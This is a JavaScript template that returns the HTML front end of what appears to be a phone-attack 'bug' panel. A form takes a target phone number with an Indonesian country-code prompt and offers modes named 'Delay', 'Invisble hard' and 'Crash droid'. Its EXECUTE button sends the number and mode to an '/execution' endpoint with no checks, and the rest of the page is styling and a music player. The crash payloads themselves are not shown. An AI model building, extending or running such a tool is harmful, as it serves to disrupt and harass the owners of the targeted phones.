        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Web-Api</title>

  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@300;500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">

  <style>
    :root {
      --neon1: #b84dff;
      --neon2: #00ffae;
      --panel: rgba(255,255,255,0.08);
      --text: #f3eaff;
      --bg: #0d0017;
    }

    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: Inter, sans-serif;
      background: radial-gradient(circle at top, #130024, #000010);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      color: var(--text);
      text-align: center;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content:"";
      position:absolute; inset:0;
      background: url("https://files.catbox.moe/5ilq94.jpg") no-repeat center/cover fixed;
      opacity: 0.12;
      filter: blur(10px);
    }
    body > * { position: relative; z-index:1; }

    .logo {
      width: 280px;
      height: 110px;
      border-radius: 20px;
      overflow: hidden;
      margin-bottom: 20px;
      box-shadow: 0 0 30px rgba(184,77,255,0.5), 0 0 40px rgba(0,255,174,0.2);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .logo img { width: 100%; height: 100%; object-fit: cover; }
    .logo:hover { transform: scale(1.05); }

    /* 🎵 Music section */
    .music-section {
      background: url("https://files.catbox.moe/5ilq94.jpg") no-repeat center/cover;
      padding: 18px 20px;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(184,77,255,0.3), inset 0 0 20px rgba(0,255,174,0.1);
      max-width: 320px;
      width: 100%;
      position: relative;
      margin-bottom: 25px;
    }

    .music-controls {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .music-btn {
      padding: 12px;
      border: none;
      border-radius: 25px;
      background: linear-gradient(90deg, var(--neon1), var(--neon2));
      color: #fff;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 0 15px rgba(184,77,255,0.5);
      transition: all 0.3s ease;
    }

    .music-btn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 25px var(--neon1), 0 0 25px var(--neon2);
    }

    .music-playing {
      animation: pulse 1.8s infinite alternate;
    }

    @keyframes pulse {
      from { box-shadow: 0 0 20px rgba(184,77,255,0.4); }
      to { box-shadow: 0 0 40px rgba(0,255,174,0.6); transform: scale(1.05); }
    }

    .music-select {
      border-radius: 10px;
      background: rgba(0,0,0,0.4);
      color: #fff;
      padding: 10px;
      border: 1px solid rgba(255,255,255,0.2);
      outline: none;
      font-size: 14px;
    }

    h1 {
      font-family: "Orbitron", sans-serif;
      font-size: 24px;
      margin-bottom: 22px;
      background: linear-gradient(90deg, var(--neon1), var(--neon2));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 15px rgba(184,77,255,0.5);
    }

    .form {
      display: flex;
      flex-direction: column;
      gap: 14px;
      width: 100%;
      max-width: 380px;
      background: rgba(255,255,255,0.04);
      padding: 25px 22px;
      border-radius: 18px;
      box-shadow: 0 0 25px rgba(184,77,255,0.3), 0 0 20px rgba(0,255,174,0.2);
    }
    input, select {
      width: 100%;
      padding: 14px 16px;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.15);
      background: var(--panel);
      color: var(--text);
      font-size: 15px;
      outline: none;
      transition: 0.3s;
    }

    .btn {
      margin-top: 10px;
      padding: 14px;
      border: none;
      border-radius: 30px;
      background: linear-gradient(90deg, var(--neon1), var(--neon2));
      color: #fff;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 0 20px rgba(184,77,255,0.5);
      transition: 0.3s;
    }
    .btn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 30px var(--neon1), 0 0 35px var(--neon2);
    }

    audio { display: none; }
  </style>
</head>
<body>

  <!-- Audio -->
  <audio id="bgm" loop></audio>

  <!-- Logo -->
  <div class="logo">
    <img src="https://files.catbox.moe/l9ejm9.jpg" alt="Logo">
  </div>

  <!-- 🎵 Music Section -->
  <div class="music-section">
    <div class="music-controls">
      <select id="songSelect" class="music-select">
        <option value="">-- Select Music --</option>
        <option value="https://files.catbox.moe/hv0f9s.mp3">music 1 -</option>
        <option value="https://files.catbox.moe/7xec5e.m4a">music 2 -</option>
        <option value="https://files.catbox.moe/hj2asb.mp3">music 3 -</option>
        <option value="https://files.catbox.moe/zqk7t3.mp3">music 4 -</option>
      </select>
      <button id="musicBtn" class="music-btn"><i class="fas fa-play"></i> Putar Musik</button>
    </div>
  </div>

  <h1>One Verse</h1>

  <!-- Form -->
  <div class="form">
    <input type="text" id="numberInput" placeholder="Example 62....." />
    <select id="modeSelect">
      <option value="" disabled selected>-- Select Menu --</option>
      <option value="delay">Delay 50%</option>
      <option value="medium">Delay 100%</option>
      <option value="blank-ios">Invisble hard</option>
      <option value="blank">Invisble Low</option>
      <option value="fc">Crash droid</option>
    </select>
    <button id="executeBtn" class="btn"><i class="fas fa-bolt"></i> EXECUTE</button>
  </div>

  <script>
  const inputField = document.getElementById('numberInput');
  const modeSelect = document.getElementById('modeSelect');
  const executeBtn = document.getElementById('executeBtn');

  executeBtn.addEventListener('click', () => {
    const number = inputField.value.trim().replace(/\s+/g, '');
    const selectedMode = modeSelect.value;
    // langsung eksekusi tanpa cek disable
    window.location.href = '/execution?mode=' + selectedMode + '&target=' + encodeURIComponent(number);
  });
  
    const bgm = document.getElementById('bgm');
    const musicBtn = document.getElementById('musicBtn');
    const songSelect = document.getElementById('songSelect');
    let isPlaying = false;

    musicBtn.addEventListener('click', async () => {
      const selected = songSelect.value;
      if (!selected) {
        alert('Pilih lagu terlebih dahulu!');
        return;
      }

      if (!isPlaying) {
        bgm.src = selected;
        await bgm.play().catch(err => console.log(err));
        isPlaying = true;
        musicBtn.innerHTML = '<i class="fas fa-pause"></i> Pause Musik';
        musicBtn.classList.add('music-playing');
      } else {
        bgm.pause();
        isPlaying = false;
        musicBtn.innerHTML = '<i class="fas fa-play"></i> Putar Musik';
        musicBtn.classList.remove('music-playing');
      }
    });
  </script>
</body>
</html>`;
};